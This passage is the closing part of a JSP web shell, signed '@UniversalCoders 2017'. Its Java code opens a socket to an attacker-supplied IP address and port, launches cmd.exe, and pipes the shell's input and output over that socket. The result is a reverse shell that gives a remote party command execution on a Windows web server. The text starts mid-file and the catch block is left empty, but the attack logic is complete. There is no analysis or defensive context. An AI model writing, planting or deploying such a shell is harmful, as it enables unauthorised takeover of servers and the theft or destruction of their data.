 try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());

                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");

                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());

                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());

                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>

<!-- @UniversalCoders 2017   -->
